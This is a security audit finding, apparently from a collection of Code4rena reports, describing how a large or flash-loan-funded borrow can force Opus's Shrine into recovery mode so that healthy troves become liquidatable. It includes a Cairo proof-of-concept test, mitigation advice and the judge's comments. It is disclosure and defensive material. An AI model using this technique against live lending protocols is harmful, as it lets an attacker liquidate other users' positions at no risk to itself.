---
tags:
  - blockchain/starknet
  - lang/cairo
  - lang/rust
  - sector/cdp
  - sector/lending
  - sector/options
  - platform/code4rena
  - has/github
  - has/poc
  - severity/high
  - trigger/flash-loan
  - precondition/flash-loan-available
protocol: "[[Opus]]"
auditors:
  - "[[3docSec]]"
report: "https://code4rena.com/reports/2024-01-opus"
genome:
  - "[[liquidation-logic]]"
  - "[[flash-loan]]"
  - "[[flash-loan-available]]"
  - "[[frontrun]]"
  - "[[flashloan-callback-auth]]"
  - "[[liquidation-underwater]]"
  - "[[frontrun-exposure]]"
---
# [H-04] Shrine's recovery mode can be weaponized as leverage to liquidate healthy troves

- id: 30423
- impact: HIGH
- protocol: [[Opus]]
- reporter: 3docSec (Code4rena)
- source: https://code4rena.com/reports/2024-01-opus

## Summary


This bug report describes a vulnerability in the Shrine implementation of the Opus protocol. The vulnerability allows a user to trigger the system into recovery mode, causing previously healthy loans to be liquidated. This can be done by opening a new loan with a large amount of collateral, which raises the overall loan-to-value ratio (LTV) above the recovery threshold. This can be achieved through a flash loan attack or by pre-depositing a large amount of collateral. The vulnerability has been confirmed and may have been fixed. The recommended mitigation steps include implementing separate LTV references for accepting liquidations and new loans, similar to other DeFi protocols. This vulnerability is classified as a high-risk MEV (miner-extractable value) issue.

## Details


### Lines of code

<https://github.com/code-423n4/2024-01-opus/blob/4720e9481a4fb20f4ab4140f9cc391a23ede3817/src/core/shrine.cairo#L1046>

### Description

In the Shrine implementation, the loan (trove) health is calculated by having its LTV compared to the shrine threshold:

```cairo
File: shrine.cairo
1133:         fn is_healthy_helper(self: @ContractState, health: Health) -> bool {
1134:             health.ltv <= health.threshold
1135:         }
---
1140:         fn assert_valid_trove_action(self: @ContractState, trove_id: u64) {
1141:             let health: Health = self.get_trove_health(trove_id);
1142:             assert(self.is_healthy_helper(health), 'SH: Trove LTV is too high');
```

The shrine threshold is in turn calculated from the weighted thresholds of the yang deposits, scaled down by a variable factor, in case the shrine is in recovery mode:

```cairo
File: shrine.cairo
1040:         fn get_trove_health(self: @ContractState, trove_id: u64) -> Health {
---
1045:             let (mut threshold, mut value) = self.get_threshold_and_value(trove_yang_balances, interval);
1046:             threshold = self.scale_threshold_for_recovery_mode(threshold);
---
1202:         fn scale_threshold_for_recovery_mode(self: @ContractState, mut threshold: Ray) -> Ray {
1203:             let shrine_health: Health = self.get_shrine_health();
1204: 
1205:             if self.is_recovery_mode_helper(shrine_health) {
1206:                 let recovery_mode_threshold: Ray = shrine_health.threshold * RECOVERY_MODE_THRESHOLD_MULTIPLIER.into();
1207:                 return max(
1208:                     threshold * THRESHOLD_DECREASE_FACTOR.into() * (recovery_mode_threshold / shrine_health.ltv),
1209:                     (threshold.val / 2_u128).into()
1210:                 );
1211:             }
1212: 
1213:             threshold
1214:         }
```

We can see from the above code that triggering recovery mode lowers the threshold, exposing the more under-collateralized loans (troves) to liquidation. This is expected behavior when the LTV fluctuations are coming from collateral price swings.

If we look at how recovery mode is triggered:

```cairo
File: shrine.cairo
0079:     const RECOVERY_MODE_THRESHOLD_MULTIPLIER: u128 = 700000000000000000000000000; // 0.7 (ray)
---
1165:         fn is_recovery_mode_helper(self: @ContractState, health: Health) -> bool {
1166:             let recovery_mode_threshold: Ray = health.threshold * RECOVERY_MODE_THRESHOLD_MULTIPLIER.into();
1167:             health.ltv >= recovery_mode_threshold
1168:         }
```

We can see that all it takes to trigger recovery mode is to bring the shrine LTV to 70% of its nominal threshold, or higher. This can be achieved by a malicious (or naive) user, provided they have enough collateral to take large borrows close to the collateralization threshold, and the shrine `debt_ceiling` provides enough headroom.

### Impact

Loans can be forced into liquidation territory, and be liquidated, whenever a new loan is opened large enough to trigger recovery mode.
This can also happen as a deliberate attack, and within a single transaction, without exposing the attacker's funds to liquidation. It is consequently a solid candidate for a flash loan attack, but can also be executed with a large amount of pre-deposited collateral.

### Proof of Concept

The following test case can be added to `test_shrine.cairo` to show how a large collateral injection `+` large loan can force a pre-existing loan into an unhealthy state, ready to be liquidated:

```cairo
    #[test]
    fn test_shrine_recovery() {
        let wad: u128 = 1000000000000000000;
        let shrine: IShrineDispatcher = shrine_utils::shrine_setup_with_feed(Option::None);
        let yangs: Span<ContractAddress> = shrine_utils::three_yang_addrs();
        let yang1_addr: ContractAddress = *yangs.at(0);

        // trove 1: deposits 1 wad, mints nothing - they just contribute to the health of the protocol
        start_prank(CheatTarget::One(shrine.contract_address), shrine_utils::admin());
        let trove1_deposit: u128 = 1 * wad;
        shrine.deposit(yang1_addr, 1, trove1_deposit.into());

        // trove 2: deposits 1 wad, mints 90% of what they can (slightly overcollateralized)
        let trove2_deposit: u128 = 1 * wad;
        shrine.deposit(yang1_addr, 2, trove2_deposit.into());

        let forge_amt2 = shrine.get_max_forge(2).val * 9 / 10;
        shrine.forge(shrine_utils::admin(), 2, forge_amt2.into(), WadZeroable::zero());

        // life is good
        let mut health = shrine.get_shrine_health();
        assert(false == shrine.is_recovery_mode(), '');

        // trove 3: deposits a flash-loaned collateral, mints A LOT to raise the LTV 
        let trove3_deposit: u128 = 10 * wad;
        shrine.deposit(yang1_addr, 3, trove3_deposit.into());

        let forge_amt3: u128 = shrine.get_max_forge(3).val * 85 / 100;
        shrine.forge(shrine_utils::admin(), 3, forge_amt3.into(), WadZeroable::zero());

        health = shrine.get_shrine_health();
        let trove2_health = shrine.get_trove_health(2);

        // things are not good anymore. Shrine is in recovery mode and trove 2 can now be liquidated
        assert(shrine.is_recovery_mode(), '');
        assert(trove2_health.ltv > trove2_health.threshold, '')
    }
```

### Tools Used

Foundry

### Recommended Mitigation Steps

It is not entirely clear how the recovery mechanism, intended as is, can be modified to fix this issue. Introducing a form of limitation to liquidations happening in the same block of a recovery trigger can mitigate exposure to flash-loans, but large loans against pre-owned collateral left dormant on the shrine would still be a viable attack path.

What we can tell, however, is that the recovery mechanism appears to have the intent of increasing the difficulty of opening new loans as the shrine health approaches the liquidation threshold.

Popular DeFi protocols like Compound solved this very issue by having two different LTV references: one for accepting liquidations and one lower for accepting new loans.

More in detail, the protocol is vulnerable only because one can borrow at LTV values above the recovery threshold (70% of the nominal threshold) but still below the liquidation threshold. Therefore, is able to raise the global LTV above that recovery threshold. If users were not allowed to borrow above that 70%, they wouldn't be able to raise the global LTV above it, even with infinite collateral.

### Assessed type

MEV

**[tserg (Opus) confirmed and commented via duplicate issue #205](https://github.com/code-423n4/2024-01-opus-findings/issues/205#issuecomment-1931436006):**
> This is valid - potentially fixed.

**[0xsomeone (judge) commented](https://github.com/code-423n4/2024-01-opus-findings/issues/9#issuecomment-1964601048):**
 > The warden has demonstrated how the automatic recovery mode mechanism of the Opus system can be exploited to force the system into recovery mode, enabling the liquidation of previously healthy troves.
> 
> A high-risk vulnerability rating for this issue is valid as the automatic recovery mode can be exploited within a single transaction to force the system into recovery mode by opening a bad position, liquidating whichever troves are lucrative, and closing the previously bad position with zero risk.

***
